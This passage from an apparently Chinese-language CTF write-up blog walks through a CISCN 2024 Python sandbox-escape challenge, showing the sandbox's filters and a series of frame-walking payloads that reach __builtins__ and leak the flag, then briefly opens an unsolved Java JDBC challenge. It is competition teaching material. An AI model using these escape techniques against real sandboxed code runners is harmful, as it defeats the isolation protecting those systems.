    <span class="token keyword">from</span> random <span class="token keyword">import</span> seed
    <span class="token keyword">from</span> time <span class="token keyword">import</span> time

    source <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"/app/uploads/THIS_IS_TASK_RANDOM_ID.txt"</span></span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
    source_simple_check<span class="token punctuation">(</span>source<span class="token punctuation">)</span>
    source_opcode_checker<span class="token punctuation">(</span>source<span class="token punctuation">)</span>
    code <span class="token operator">=</span> <span class="token builtin">compile</span><span class="token punctuation">(</span>source<span class="token punctuation">,</span> <span class="token string">"&lt;sandbox>"</span><span class="token punctuation">,</span> <span class="token string">"exec"</span><span class="token punctuation">)</span>
    addaudithook<span class="token punctuation">(</span>block_wrapper<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    outputIO <span class="token operator">=</span> StringIO<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">with</span> redirect_stdout<span class="token punctuation">(</span>outputIO<span class="token punctuation">)</span><span class="token punctuation">:</span>
        seed<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"THIS_IS_SEED"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">exec</span><span class="token punctuation">(</span>code<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
            <span class="token string">"__builtins__"</span><span class="token punctuation">:</span> <span class="token boolean">None</span><span class="token punctuation">,</span>
            <span class="token string">"randint"</span><span class="token punctuation">:</span> randint<span class="token punctuation">,</span>
            <span class="token string">"randrange"</span><span class="token punctuation">:</span> randrange<span class="token punctuation">,</span>
            <span class="token string">"seed"</span><span class="token punctuation">:</span> seed<span class="token punctuation">,</span>
            <span class="token string">"print"</span><span class="token punctuation">:</span> <span class="token keyword">print</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span>
    output <span class="token operator">=</span> outputIO<span class="token punctuation">.</span>getvalue<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">if</span> <span class="token string">"THIS_IS_SEED"</span> <span class="token keyword">in</span> output<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"这 runtime 你就嘎嘎写吧， 一写一个不吱声啊，点儿都没拦住！"</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"bad code-operation why still happened ah?"</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>一眼python沙盒逃逸，估计是用栈帧打</p>
<p>但是过滤拉满，<code>source_simple_check</code>里面检测代码是否全是ascii值，过滤了<code>__</code>、<code>getattr</code>和 <code>exit</code></p>
<p><code>block_wrapper</code>不让用<code>gc</code>，<code>os</code>等</p>
<p><code>source_opcode_checker</code>要求opcode解释出来还不能有<code>LOAD_GLOBAL</code>、<code>IMPORT_NAME</code>、 <code>LOAD_METHOD</code></p>
<p>拿当前帧的信息测试一下</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">my_generator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">yield</span> <span class="token number">1</span>
    <span class="token keyword">yield</span> <span class="token number">2</span>
    <span class="token keyword">yield</span> <span class="token number">3</span>

gen <span class="token operator">=</span> my_generator<span class="token punctuation">(</span><span class="token punctuation">)</span>

frame <span class="token operator">=</span> gen<span class="token punctuation">.</span>gi_frame

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Local Variables:"</span><span class="token punctuation">,</span> frame<span class="token punctuation">.</span>f_locals<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Global Variables:"</span><span class="token punctuation">,</span> frame<span class="token punctuation">.</span>f_globals<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Code Object:"</span><span class="token punctuation">,</span> frame<span class="token punctuation">.</span>f_code<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Instruction Pointer:"</span><span class="token punctuation">,</span> frame<span class="token punctuation">.</span>f_lasti<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这里写了一个把代码转换成json的脚本方便在复现时缺少前端的情况下来传入</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">convert_code</span><span class="token punctuation">(</span>file_path<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>file_path<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>
        code <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>

    converted_code <span class="token operator">=</span> code<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> <span class="token string">'\\n'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'    '</span><span class="token punctuation">,</span> <span class="token string">'\\t'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\"'</span><span class="token punctuation">,</span><span class="token string">'\''</span><span class="token punctuation">)</span>

    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>file_path<span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>
        <span class="token builtin">file</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>converted_code<span class="token punctuation">)</span>

    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"代码转换完成！"</span><span class="token punctuation">)</span>

<span class="token comment"># 将文件路径替换为你要转换的文件路径</span>
file_path <span class="token operator">=</span> <span class="token string">'./1.py'</span>
convert_code<span class="token punctuation">(</span>file_path<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/blog/2024/05/18/CISCN2024/image-20240520141747919.png" alt="image-20240520141747919"></p>
<p>然后尝试直接读</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">waff</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">f</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">yield</span> g<span class="token punctuation">.</span>gi_frame<span class="token punctuation">.</span>f_back

    g <span class="token operator">=</span> f<span class="token punctuation">(</span><span class="token punctuation">)</span>
    frame <span class="token operator">=</span> <span class="token builtin">next</span><span class="token punctuation">(</span>g<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>frame<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>frame<span class="token punctuation">.</span>f_back<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>frame<span class="token punctuation">.</span>f_back<span class="token punctuation">.</span>f_back<span class="token punctuation">)</span>
    b <span class="token operator">=</span> frame<span class="token punctuation">.</span>f_back<span class="token punctuation">.</span>f_back<span class="token punctuation">.</span>f_globals<span class="token punctuation">[</span><span class="token string">'flag'</span><span class="token punctuation">]</span>
b<span class="token operator">=</span>waff<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/blog/2024/05/18/CISCN2024/image-20240520141948532.png" alt="image-20240520141948532"></p>
<p>被测了</p>
<p>这里的问题其实出在了<code>next</code>上，改成生成器表达式的形式</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">waff</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">f</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">yield</span> g<span class="token punctuation">.</span>gi_frame<span class="token punctuation">.</span>f_back

    g <span class="token operator">=</span> f<span class="token punctuation">(</span><span class="token punctuation">)</span>
    frame <span class="token operator">=</span> <span class="token punctuation">[</span>x <span class="token keyword">for</span> x <span class="token keyword">in</span> g<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>frame<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>frame<span class="token punctuation">.</span>f_back<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>frame<span class="token punctuation">.</span>f_back<span class="token punctuation">.</span>f_back<span class="token punctuation">)</span>
    b <span class="token operator">=</span> frame<span class="token punctuation">.</span>f_back<span class="token punctuation">.</span>f_back<span class="token punctuation">.</span>f_globals<span class="token punctuation">[</span><span class="token string">'flag'</span><span class="token punctuation">]</span>
    <span class="token keyword">return</span> b
b<span class="token operator">=</span>waff<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/blog/2024/05/18/CISCN2024/image-20240520142346620.png" alt="image-20240520142346620"></p>
<p>没出flag，因为我们的flag变量名被换成了<code>THIS_IS_SEED</code>，也没报错，不着急，看看前面几个栈帧</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">waff</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">f</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">yield</span> g<span class="token punctuation">.</span>gi_frame<span class="token punctuation">.</span>f_back

    g <span class="token operator">=</span> f<span class="token punctuation">(</span><span class="token punctuation">)</span>
    frame <span class="token operator">=</span> <span class="token punctuation">[</span>x <span class="token keyword">for</span> x <span class="token keyword">in</span> g<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>frame<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>frame<span class="token punctuation">.</span>f_back<span class="token punctuation">)</span>
waff<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/blog/2024/05/18/CISCN2024/image-20240520142503727.png" alt="image-20240520142503727"></p>
<p>有结果，那么先拿个<code>__globals__</code></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">waff</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">f</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">yield</span> g<span class="token punctuation">.</span>gi_frame<span class="token punctuation">.</span>f_back

    g <span class="token operator">=</span> f<span class="token punctuation">(</span><span class="token punctuation">)</span>
    frame <span class="token operator">=</span> <span class="token punctuation">[</span>x <span class="token keyword">for</span> x <span class="token keyword">in</span> g<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>frame<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>frame<span class="token punctuation">.</span>f_back<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>frame<span class="token punctuation">.</span>f_back<span class="token punctuation">.</span>f_back<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>frame<span class="token punctuation">.</span>f_back<span class="token punctuation">.</span>f_back<span class="token punctuation">.</span>f_back<span class="token punctuation">)</span>
    glo <span class="token operator">=</span> frame<span class="token punctuation">.</span>f_back<span class="token punctuation">.</span>f_back<span class="token punctuation">.</span>f_back<span class="token punctuation">.</span>f_globals<span class="token punctuation">[</span><span class="token string">"_"</span> <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">+</span> <span class="token string">"builtins"</span> <span class="token operator">+</span> <span class="token string">"_"</span> <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">]</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>glo<span class="token punctuation">)</span>
waff<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/blog/2024/05/18/CISCN2024/image-20240520143433229.png" alt="image-20240520143433229"></p>
<p>拿到globals之后就是为所欲为了，当然不能直接执行命令，会被ban的，我们得继续利用相关的模块读信息</p>
<blockquote>
<p><code>f_code</code>: 一个代码对象（code object），包含了函数或方法的字节码指令、常量、变量名等信息</p>
</blockquote>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">waff</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">f</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">yield</span> g<span class="token punctuation">.</span>gi_frame<span class="token punctuation">.</span>f_back

    g <span class="token operator">=</span> f<span class="token punctuation">(</span><span class="token punctuation">)</span>
    frame <span class="token operator">=</span> <span class="token punctuation">[</span>x <span class="token keyword">for</span> x <span class="token keyword">in</span> g<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>frame<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>frame<span class="token punctuation">.</span>f_back<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>frame<span class="token punctuation">.</span>f_back<span class="token punctuation">.</span>f_back<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>frame<span class="token punctuation">.</span>f_back<span class="token punctuation">.</span>f_back<span class="token punctuation">.</span>f_back<span class="token punctuation">)</span>
    glo <span class="token operator">=</span> frame<span class="token punctuation">.</span>f_back<span class="token punctuation">.</span>f_back<span class="token punctuation">.</span>f_back<span class="token punctuation">.</span>f_globals<span class="token punctuation">[</span><span class="token string">"_"</span> <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">+</span> <span class="token string">"builtins"</span> <span class="token operator">+</span> <span class="token string">"_"</span> <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">]</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>glo<span class="token punctuation">)</span>
    <span class="token builtin">dir</span> <span class="token operator">=</span> glo<span class="token punctuation">.</span><span class="token builtin">dir</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">dir</span><span class="token punctuation">)</span>
    getflag <span class="token operator">=</span> frame<span class="token punctuation">.</span>f_back<span class="token punctuation">.</span>f_back<span class="token punctuation">.</span>f_back<span class="token punctuation">.</span>f_code
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">dir</span><span class="token punctuation">(</span>getflag<span class="token punctuation">)</span><span class="token punctuation">)</span>
waff<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/blog/2024/05/18/CISCN2024/image-20240520143659471.png" alt="image-20240520143659471"></p>
<p>打印一下里面的常量<code>co_consts</code></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">waff</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">f</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">yield</span> g<span class="token punctuation">.</span>gi_frame<span class="token punctuation">.</span>f_back

    g <span class="token operator">=</span> f<span class="token punctuation">(</span><span class="token punctuation">)</span>
    frame <span class="token operator">=</span> <span class="token punctuation">[</span>x <span class="token keyword">for</span> x <span class="token keyword">in</span> g<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
    glo <span class="token operator">=</span> frame<span class="token punctuation">.</span>f_back<span class="token punctuation">.</span>f_back<span class="token punctuation">.</span>f_back<span class="token punctuation">.</span>f_globals<span class="token punctuation">[</span><span class="token string">"_"</span> <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">+</span> <span class="token string">"builtins"</span> <span class="token operator">+</span> <span class="token string">"_"</span> <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">]</span>
    <span class="token builtin">dir</span> <span class="token operator">=</span> glo<span class="token punctuation">.</span><span class="token builtin">dir</span>
    getflag <span class="token operator">=</span> frame<span class="token punctuation">.</span>f_back<span class="token punctuation">.</span>f_back<span class="token punctuation">.</span>f_back<span class="token punctuation">.</span>f_code
    <span class="token keyword">for</span> i <span class="token keyword">in</span> getflag<span class="token punctuation">.</span>co_consts<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
waff<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/blog/2024/05/18/CISCN2024/image-20240520143852477.png" alt="image-20240520143852477"></p>
<p>这里被最后的<code>THIS_IS_SEED</code>检测给拦住了，用<code>str</code>方法转成字符串就可以打了</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">waff</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">f</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">yield</span> g<span class="token punctuation">.</span>gi_frame<span class="token punctuation">.</span>f_back

    g <span class="token operator">=</span> f<span class="token punctuation">(</span><span class="token punctuation">)</span>
    frame <span class="token operator">=</span> <span class="token punctuation">[</span>x <span class="token keyword">for</span> x <span class="token keyword">in</span> g<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
    glo <span class="token operator">=</span> frame<span class="token punctuation">.</span>f_back<span class="token punctuation">.</span>f_back<span class="token punctuation">.</span>f_back<span class="token punctuation">.</span>f_globals<span class="token punctuation">[</span><span class="token string">"_"</span> <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">+</span> <span class="token string">"builtins"</span> <span class="token operator">+</span> <span class="token string">"_"</span> <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">]</span>
    <span class="token builtin">dir</span> <span class="token operator">=</span> glo<span class="token punctuation">.</span><span class="token builtin">dir</span>
    <span class="token builtin">str</span> <span class="token operator">=</span> glo<span class="token punctuation">.</span><span class="token builtin">str</span>
    getflag <span class="token operator">=</span> frame<span class="token punctuation">.</span>f_back<span class="token punctuation">.</span>f_back<span class="token punctuation">.</span>f_back<span class="token punctuation">.</span>f_code
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">(</span>getflag<span class="token punctuation">.</span>co_consts<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
waff<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/blog/2024/05/18/CISCN2024/image-20240520144412328.png" alt="image-20240520144412328"></p>
<hr>
<h2 id="ezjava-Unsolved"><a href="#ezjava-Unsolved" class="headerlink" title="ezjava (Unsolved)"></a>ezjava (Unsolved)</h2><blockquote>
<p>CVE-2023-32697</p>
</blockquote>
<p>jdbc打数据库，给了mysql，psql和sqlite三个数据库接口，但是我不会jdbc</p>
<p>看一下依赖：mysql-connector-java-8.0.13.jar</p>

    </div>
    
    
    
    
    
    
    
</div>

            </div>
        </transition>
        
        <transition name="fade">
            <div id="preview" ref="preview" v-show="previewShow">
                <img id="preview-content" ref="previewContent" />
            </div>
        </transition>
        
    </div>
    <script src="/blog/js/main.js"></script>
    
    




    
    

<div id="vcomments"></div>

<script src="/blog/js/lib/valine.min.js"></script>
<script>
    new Valine({
        el: '#vcomments',
        app_id: 'U9mZLKunkRUTcBFthjXPjnZE-9Nh9j0Va',
        app_key: 'SzWOnY0PWLGNuL6jW8TZYc7j',
        visitor: 'true',
        placeholder: '写点什么吧(●ˇ∀ˇ●)',
        serverURLs: 'https://u9mzlkun.lc-cn-n1-shared.com',
    });
</script>

    <footer id="footer">
    <div id="footer-wrap">
        <div>
            &copy;
            2022 - 2025 雲流のLowest World
            <span id="footer-icon">
                <i class="fa-solid fa-font-awesome fa-fw"></i>
            </span>
            &commat;C1oudfL0w0
        </div>
        <div>
            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
            <a target="_blank" rel="noopener" href="https://github.com/argvchs/hexo-theme-particlex">ParticleX Theme</a>
        </div>
        
    </div>
</footer>

<script src="/blog/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/blog/live2dw/assets/z16.model.json"},"display":{"position":"left","width":150,"height":290},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>

</html>